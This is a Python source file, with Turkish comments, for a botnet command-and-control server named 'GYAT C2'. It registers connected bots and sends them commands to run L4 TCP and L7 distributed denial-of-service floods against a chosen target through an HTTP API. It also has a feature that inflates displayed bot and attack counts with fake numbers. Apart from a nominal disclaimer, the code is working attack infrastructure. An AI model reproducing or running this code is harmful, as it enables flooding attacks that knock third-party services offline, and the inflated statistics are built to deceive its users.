import json
import socket
import threading
import time
import random
import os
from datetime import datetime

# Renkli terminal çıktıları için
class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

# Yapılandırma dosyasını yükle
def load_config():
    try:
        with open('config.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        print(f"{Colors.FAIL}[ERROR] Can't find config.json !{Colors.ENDC}")
        exit(1)

# Log fonksiyonu
def log(message, level="INFO"):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    color = Colors.OKBLUE
    if level == "ERROR":
        color = Colors.FAIL
    elif level == "WARNING":
        color = Colors.WARNING
    elif level == "SUCCESS":
        color = Colors.OKGREEN
    
    print(f"{color}[{timestamp}] [{level}] {message}{Colors.ENDC}")

# Bağlı botları tutan liste
connected_bots = []
active_attacks = []

# Saldırı sınıfı
class Attack:
    def __init__(self, attack_id, attack_type, target, port, duration, concurrency):
        self.attack_id = attack_id
        self.attack_type = attack_type  # "L4" veya "L7"
        self.target = target
        self.port = port
        self.duration = duration
        self.concurrency = concurrency
        self.start_time = time.time()
        self.is_active = True
        self.assigned_bots = []

    def is_expired(self):
        return time.time() - self.start_time > self.duration

    def stop(self):
        self.is_active = False
        log(f"Attack stopped: {self.attack_id}", "SUCCESS")

# Bot sınıfı
class Bot:
    def __init__(self, conn, addr):
        self.conn = conn
        self.addr = addr
        self.id = f"bot_{random.randint(1000, 9999)}"
        self.is_busy = False
        self.current_attack = None
        self.last_ping = time.time()
        self.is_alive = True

    def send_command(self, command):
        try:
            self.conn.send(command.encode())
            return True
        except:
            self.is_alive = False
            return False

    def check_alive(self):
        if time.time() - self.last_ping > 60:  # 60 saniye ping alınmazsa bot ölü kabul edilir
            self.is_alive = False
        return self.is_alive

# Bot bağlantı işleyicisi
def handle_bot(conn, addr):
    bot = Bot(conn, addr)
    connected_bots.append(bot)
    log(f"New bot connected: {bot.id} ({addr[0]}:{addr[1]})", "SUCCESS")
    
    try:
        while bot.is_alive:
            try:
                data = conn.recv(1024).decode()
                if not data:
                    break
                
                if data.startswith("PING"):
                    bot.last_ping = time.time()
                    conn.send("PONG".encode())
                elif data.startswith("REPORT"):
                    # Bot'tan rapor alma
                    log(f"Bot raporu: {bot.id} - {data[7:]}")
                
            except socket.timeout:
                if not bot.check_alive():
                    break
            except:
                break
    finally:
        if bot in connected_bots:
            connected_bots.remove(bot)
        conn.close()
        log(f"Bot connection closed: {bot.id}", "WARNING")

# Saldırı yöneticisi
def attack_manager():
    while True:
        for attack in list(active_attacks):
            if attack.is_expired() or not attack.is_active:
                for bot in attack.assigned_bots:
                    bot.is_busy = False
                    bot.current_attack = None
                active_attacks.remove(attack)
                log(f"Attack ended: {attack.attack_id}", "INFO")
        time.sleep(1)

# L4 TCP saldırısı başlat
def start_l4_attack(target, port, duration, concurrency, demo_mode=True):
    if demo_mode:
        log(f"DEMO MODU: L4 TCP attack simulated - Target: {target}:{port}, Duration: {duration}s, Bot: {concurrency}", "WARNING")
        attack_id = f"L4_{random.randint(1000, 9999)}"
        attack = Attack(attack_id, "L4", target, port, duration, concurrency)
        active_attacks.append(attack)
        return attack_id
    
    available_bots = [bot for bot in connected_bots if not bot.is_busy and bot.is_alive]
    if len(available_bots) == 0:
        log("Kullanılabilir bot yok!", "ERROR")
        return None
    
    bot_count = min(concurrency, len(available_bots))
    selected_bots = available_bots[:bot_count]
    
    attack_id = f"L4_{random.randint(1000, 9999)}"
    attack = Attack(attack_id, "L4", target, port, duration, bot_count)
    
    for bot in selected_bots:
        bot.is_busy = True
        bot.current_attack = attack
        attack.assigned_bots.append(bot)
        command = f"ATTACK|L4|{target}|{port}|{duration}"
        if not bot.send_command(command):
            bot.is_busy = False
            attack.assigned_bots.remove(bot)
    
    if len(attack.assigned_bots) > 0:
        active_attacks.append(attack)
        log(f"L4 TCP attack started - Target: {target}:{port}, Duration: {duration}s, Bot: {len(attack.assigned_bots)}", "SUCCESS")
        return attack_id
    else:
        log("Attack started failed - No bot received the command", "ERROR")
        return None

# L7 RAW saldırısı başlat
def start_l7_attack(target, duration, concurrency, demo_mode=True):
    if demo_mode:
        log(f"DEMO MODU: L7 RAW attack simulated - Target: {target}, Duration: {duration}s, Bot: {concurrency}", "WARNING")
        attack_id = f"L7_{random.randint(1000, 9999)}"
        attack = Attack(attack_id, "L7", target, 0, duration, concurrency)
        active_attacks.append(attack)
        return attack_id
    
    available_bots = [bot for bot in connected_bots if not bot.is_busy and bot.is_alive]
    if len(available_bots) == 0:
        log("No available bot!", "ERROR")
        return None
    
    bot_count = min(concurrency, len(available_bots))
    selected_bots = available_bots[:bot_count]
    
    attack_id = f"L7_{random.randint(1000, 9999)}"
    attack = Attack(attack_id, "L7", target, 0, duration, bot_count)
    
    for bot in selected_bots:
        bot.is_busy = True
        bot.current_attack = attack
        attack.assigned_bots.append(bot)
        command = f"ATTACK|L7|{target}|0|{duration}"
        if not bot.send_command(command):
            bot.is_busy = False
            attack.assigned_bots.remove(bot)
    
    if len(attack.assigned_bots) > 0:
        active_attacks.append(attack)
        log(f"L7 RAW attack started - Target: {target}, Duration: {duration}s, Bot: {len(attack.assigned_bots)}", "SUCCESS")
        return attack_id
    else:
        log("Attack started failed - No bot received the command", "ERROR")
        return None

# API isteklerini işle
def handle_api_request(data):
    try:
        request = json.loads(data)
        action = request.get("action")
        
        if action == "auth":
            username = request.get("username")
            password = request.get("password")
            config = load_config()
            
            if username == config["web"]["username"] and password == config["web"]["password"]:
                return json.dumps({"status": "success", "message": "Giriş başarılı", "demo_mode": config["settings"]["demo_mode"]})
            else:
                return json.dumps({"status": "error", "message": "Geçersiz kullanıcı adı veya şifre"})
        
        elif action == "get_stats":
            config = load_config()
            fake_bots = config["settings"].get("fake_bots", 0)
            fake_attacks = config["settings"].get("fake_attacks", 0)
            fake_attacks_random = config["settings"].get("fake_attacks_random_range", 0)
            
            real_bots = len(connected_bots)
            active_bots = len([bot for bot in connected_bots if bot.is_alive])
            real_attacks = len(active_attacks)
            
            # Fake bot ve attack sayılarını ekle
            total_bots = real_bots + fake_bots
            total_active_bots = active_bots + fake_bots
            total_attacks = real_attacks
            
            # Eğer fake_attacks_random > 0 ise, fake_attacks ± random aralığında rastgele bir değer ekle
            if fake_attacks > 0:
                random_offset = random.randint(-fake_attacks_random, fake_attacks_random) if fake_attacks_random > 0 else 0
                total_attacks = real_attacks + fake_attacks + random_offset
            
            return json.dumps({
                "status": "success",
                "bots": total_bots,
                "active_bots": total_active_bots,
                "attacks": total_attacks
            })
        
        elif action == "start_attack":
            attack_type = request.get("type")
            target = request.get("target")
            duration = min(int(request.get("duration", 60)), load_config()["settings"]["max_attack_duration"])
            concurrency = min(int(request.get("concurrency", 1)), load_config()["settings"]["max_concurrent_bots"])
            demo_mode = load_config()["settings"]["demo_mode"]
            
            if attack_type == "L4":
                port = int(request.get("port", 80))
                attack_id = start_l4_attack(target, port, duration, concurrency, demo_mode)
                if attack_id:
                    return json.dumps({"status": "success", "message": "L4 attack started", "attack_id": attack_id})
                else:
                    return json.dumps({"status": "error", "message": "L4 attack started failed"})
            
            elif attack_type == "L7":
                attack_id = start_l7_attack(target, duration, concurrency, demo_mode)
                if attack_id:
                    return json.dumps({"status": "success", "message": "L7 attack started", "attack_id": attack_id})
                else:
                    return json.dumps({"status": "error", "message": "L7 attack started failed"})
            
            else:
                return json.dumps({"status": "error", "message": "Invalid attack type"})
        
        elif action == "stop_attack":
            attack_id = request.get("attack_id")
            for attack in active_attacks:
                if attack.attack_id == attack_id:
                    attack.stop()
                    return json.dumps({"status": "success", "message": "Attack stopped"})
            return json.dumps({"status": "error", "message": "Attack not found"})
        
        elif action == "get_attacks":
            attacks_data = []
            for attack in active_attacks:
                elapsed = time.time() - attack.start_time
                remaining = max(0, attack.duration - elapsed)
                attacks_data.append({
                    "id": attack.attack_id,
                    "type": attack.attack_type,
                    "target": attack.target,
                    "port": attack.port,
                    "duration": attack.duration,
                    "elapsed": round(elapsed),
                    "remaining": round(remaining),
                    "bots": len(attack.assigned_bots)
                })
            return json.dumps({"status": "success", "attacks": attacks_data})
        
        elif action == "update_config":
            config = load_config()
            username = request.get("username")
            
            # Sadece root kullanıcısı için konfigürasyon güncelleme izni
            if username != config["web"]["username"]:
                return json.dumps({"status": "error", "message": "Only root user can update the configuration"})
            
            # Demo modu güncelleme
            demo_mode = request.get("demo_mode")
            if demo_mode is not None:
                config["settings"]["demo_mode"] = bool(demo_mode)
            
            # Fake bot ayarlarını güncelleme
            fake_bots = request.get("fake_bots")
            if fake_bots is not None:
                config["settings"]["fake_bots"] = int(fake_bots)
            
            # Fake attack ayarlarını güncelleme
            fake_attacks = request.get("fake_attacks")
            if fake_attacks is not None:
                config["settings"]["fake_attacks"] = int(fake_attacks)
            
            fake_attacks_random = request.get("fake_attacks_random_range")
            if fake_attacks_random is not None:
                config["settings"]["fake_attacks_random_range"] = int(fake_attacks_random)
            
            with open('config.json', 'w') as f:
                json.dump(config, f, indent=4)
            
            return json.dumps({"status": "success", "message": "Configuration updated"})
        
        else:
            return json.dumps({"status": "error", "message": "Invalid action"})
    
    except Exception as e:
        return json.dumps({"status": "error", "message": f"Request processing error: {str(e)}"})

# Web API sunucusu
def start_api_server():
    config = load_config()
    host = config["server"]["host"]
    port = config["server"]["port"]
    
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        server.bind((host, port))
        server.listen(5)
        log(f"API sunucusu başlatıldı: {host}:{port}", "SUCCESS")
        
        while True:
            client_sock, address = server.accept()
            client_handler = threading.Thread(target=handle_client, args=(client_sock, address))
            client_handler.daemon = True
            client_handler.start()
    
    except Exception as e:
        log(f"API sunucusu başlatılırken hata oluştu: {str(e)}", "ERROR")
    finally:
        server.close()

# İstemci bağlantı işleyicisi
def handle_client(client_socket, address):
    try:
        request = client_socket.recv(4096).decode()
        
        # HTTP isteği mi yoksa bot bağlantısı mı kontrol et
        if request.startswith("BOT"):
            # Bot bağlantısı
            handle_bot(client_socket, address)
        else:
            # HTTP API isteği
            headers = request.split('\r\n')
            method_path = headers[0].split(' ')
            
            if len(method_path) >= 2:
                method = method_path[0]
                path = method_path[1]
                
                if method == "OPTIONS" and path == "/api":
                    # CORS Preflight isteği
                    response = "HTTP/1.1 200 OK\r\n"
                    response += "Access-Control-Allow-Origin: *\r\n"
                    response += "Access-Control-Allow-Methods: POST, GET, OPTIONS\r\n"
                    response += "Access-Control-Allow-Headers: Content-Type\r\n"
                    response += "Access-Control-Max-Age: 86400\r\n"
                    response += "\r\n"
                    client_socket.send(response.encode())
                elif method == "POST" and path == "/api":
                    # API isteği
                    body_start = request.find('\r\n\r\n')
                    if body_start != -1:
                        body = request[body_start + 4:]
                        response_data = handle_api_request(body)
                        
                        response = "HTTP/1.1 200 OK\r\n"
                        response += "Content-Type: application/json\r\n"
                        response += "Access-Control-Allow-Origin: *\r\n"
                        response += "Access-Control-Allow-Methods: POST, GET, OPTIONS\r\n"
                        response += "Access-Control-Allow-Headers: Content-Type\r\n"
                        response += f"Content-Length: {len(response_data)}\r\n"
                        response += "\r\n"
                        response += response_data
                        
                        client_socket.send(response.encode())
                else:
                    # 404 Not Found
                    response = "HTTP/1.1 404 Not Found\r\n\r\n"
                    client_socket.send(response.encode())
            else:
                # Geçersiz istek
                response = "HTTP/1.1 400 Bad Request\r\n\r\n"
                client_socket.send(response.encode())
    
    except Exception as e:
        log(f"İstemci işlenirken hata oluştu: {str(e)}", "ERROR")
    finally:
        client_socket.close()

# Ana fonksiyon
def main():
    log("GYAT C2 Server is starting...", "INFO")
    log("Kitty Dev - imscruz @ GYATC2 | Dont use for unlegal activities.", "WARNING")
    
    # Yapılandırma dosyasını kontrol et
    config = load_config()
    log(f"Configuration loaded: {config['server']['host']}:{config['server']['port']}", "INFO")
    log(f"Demo mode: {'Active' if config['settings']['demo_mode'] else 'Disabled'}", "INFO")
    
    # Saldırı yöneticisini başlat
    attack_thread = threading.Thread(target=attack_manager)
    attack_thread.daemon = True
    attack_thread.start()
    
    # API sunucusunu başlat
    start_api_server()

if __name__ == "__main__":
    main()